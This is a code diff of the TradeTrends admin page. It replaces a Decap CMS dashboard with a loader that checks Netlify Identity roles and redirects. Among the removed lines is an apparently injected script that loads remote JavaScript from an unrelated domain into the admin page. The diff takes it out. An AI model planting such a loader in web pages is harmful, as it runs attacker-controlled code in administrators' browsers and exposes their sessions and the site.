@@ -3,164 +3,86 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting...</title>
-  <meta http-equiv="refresh" content="0;url=/admin/dashboard.html">
-  <script>
-    // Immediate redirect
-    window.location.replace('/admin/dashboard.html');
-  </script>
-</head>
-<body>
-  <p>Redirecting to dashboard...</p>
-</body>
-</html>
-  <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
-    (function () {
-        var script = document.createElement("script");
-        script.async = 1;
-        script.src = 'https://emrldtp.cc/NDg3NDU2.js?t=487456';
-        document.head.appendChild(script);
-    })();
-  </script>
-  <title>TradeTrends Admin</title>
+  <title>Admin - TradeTrends</title>
   <meta name="robots" content="noindex,nofollow" />
-  <meta name="theme-color" content="#0b1118" />
-  <link rel="stylesheet" href="/admin/admin.css" />
   <style>
-    html, body {
+    body {
       margin: 0;
       background: radial-gradient(circle at top, #0b1d26, #050b10);
       color: white;
-      height: 100%;
+      min-height: 100vh;
       font-family: Inter, system-ui, sans-serif;
-    }
-
-    .admin-header {
       display: flex;
-      justify-content: space-between;
       align-items: center;
-      padding: 14px 20px;
-      background: rgba(5,15,25,0.9);
-      backdrop-filter: blur(12px);
-      border-bottom: 1px solid rgba(0,255,255,0.15);
-      position: sticky;
-      top: 0;
-      z-index: 9999;
+      justify-content: center;
     }
-
-    .logo {
-      font-size: 18px;
-      font-weight: 600;
-      color: #3cf;
+    .loader {
+      text-align: center;
     }
-
-    .admin-btn {
-      margin-left: 10px;
-      padding: 8px 14px;
-      border-radius: 8px;
-      background: rgba(0,255,255,0.12);
-      color: #9ff;
-      text-decoration: none;
-      border: 1px solid rgba(0,255,255,0.3);
-      cursor: pointer;
-      transition: all .2s;
-      font-size: 14px;
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255,255,255,0.1);
+      border-top-color: #00d2ff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
     }
-
-    .admin-btn:hover {
-      background: rgba(0,255,255,0.25);
-      color: white;
-    }
-
-    .admin-btn.danger {
-      border-color: rgba(255,80,80,.5);
-      color: #ff9b9b;
-    }
-
-    .admin-btn.danger:hover {
-      background: rgba(255,80,80,.2);
-    }
-
-    #nc-root {
-      min-height: calc(100vh - 70px);
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <!-- Access Denied Message (hidden by default) -->
-  <div id="accessDenied">
-    <div>
-      <h2>Access Denied</h2>
-      <p>This admin dashboard is restricted to users with the <strong>admin</strong> role.</p>
-      <p>If you believe you should have access, please contact the site administrator.</p>
-    </div>
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Checking authentication...</p>
   </div>
-
-  <!-- Draft Mode Banner -->
-  <div style="background: linear-gradient(135deg, #ff6b35 0%, #ffd700 100%); color: #000; padding: 10px 20px; text-align: center; font-weight: 600; font-size: 14px; border-bottom: 2px solid #ff6b35;">
-    📝 Draft Mode: Changes save to <code style="background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 3px;">content</code> branch (not live until merged to <code style="background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 3px;">main</code>)
-  </div>
-
-  <!-- Dev Environment Notice (shows only in non-production) -->
-  <div id="dev-notice" style="display:none; background: #0a3d62; color: #00d2ff; padding: 8px 20px; text-align: center; font-size: 13px; border-bottom: 1px solid #00d2ff;">
-    💻 <strong>Local Dev Mode:</strong> Use the <a href="/admin/deals.html" style="color: #00d2ff; text-decoration: underline;">Deal Editor</a> to manage products • Changes save to <code style="background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px;">content</code> branch only
-  </div>
-
-  <!-- Admin Header -->
-  <header class="admin-header">
-    <div class="admin-left">
-      <div class="logo">TradeTrends Admin</div>
-    </div>
-    <div class="admin-right">
-      <a href="/" target="_blank" class="admin-btn">View Site</a>
-      <a href="/admin/dashboard.html" class="admin-btn">Dashboard</a>
-      <a href="/admin/trends.html" class="admin-btn">Trends</a>
-      <a href="/admin/deals.html" class="admin-btn" style="background: rgba(0,210,255,0.2); border-color: #00d2ff;">✏️ Edit Deals</a>
-      <button id="adminLogout" class="admin-btn danger">Logout</button>
-    </div>
-  </header>
-
-  <!-- Decap CMS Mount Point -->
-  <div id="nc-root"></div>
-
-  <!-- Show dev notice in local/Codespaces environments -->
-  <script>
-    (function() {
-      const hostname = window.location.hostname;
-      const isLocal = hostname === 'localhost' || 
-                      hostname.includes('127.0.0.1') ||
-                      hostname.includes('app.github.dev') ||
-                      hostname.includes('gitpod.io') ||
-                      hostname.includes('codespaces');
-      
-      if (isLocal) {
-        const devNotice = document.getElementById('dev-notice');
-        if (devNotice) devNotice.style.display = 'block';
-        
-        // Check if local backend server is running
-        const port8081 = hostname.includes('app.github.dev') 
-          ? location.origin.replace(/-\d+\.app\.github\.dev/, '-8081.app.github.dev')
-          : 'http://localhost:8081';
-        
-        fetch(port8081 + '/api/v1')
-          .then(() => {
-            const localBanner = document.getElementById('local-cms-banner');
-            if (localBanner) localBanner.style.display = 'block';
-          })
-          .catch(() => {
-            // Local backend not running, will use git-gateway
-          });
-      }
-    })();
-  </script>
-
-  <!-- Netlify Identity (login) -->
+  
   <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>
-
-  <!-- Decap CMS - auto-init with config.yml -->
-  <script src="https://unpkg.com/decap-cms@^3.0.0/dist/decap-cms.js"></script>
-
-  <!-- CMS Customizations (autofill, auth, roles) - will call CMS.init() -->
-  <script src="/admin/cms.js"></script>
+  <script>
+    // Check if in dev mode
+    function isDevMode() {
+      const hostname = window.location.hostname;
+      return hostname === 'localhost' || 
+             hostname.includes('127.0.0.1') ||
+             hostname.includes('app.github.dev') ||
+             hostname.includes('gitpod.io') ||
+             hostname.includes('codespaces');
+    }
+    
+    // In dev mode, redirect immediately
+    if (isDevMode()) {
+      window.location.href = '/admin/dashboard.html';
+    } else {
+      // In production, wait for authentication
+      if (window.netlifyIdentity) {
+        netlifyIdentity.on('init', user => {
+          if (user) {
+            const roles = user.app_metadata?.roles || [];
+            if (roles.includes('admin')) {
+              window.location.href = '/admin/dashboard.html';
+            } else {
+              // Not an admin, redirect to home
+              window.location.href = '/';
+            }
+          } else {
+            // Not logged in, redirect to home
+            window.location.href = '/';
+          }
+        });
+        
+        // Timeout fallback
+        setTimeout(() => {
+          if (window.location.pathname.includes('/admin')) {
+            window.location.href = '/';
+          }
+        }, 5000);
+      } else {
+        // Identity not loaded, redirect to home
+        window.location.href = '/';
+      }
+    }
+  </script>
 </body>
 </html>
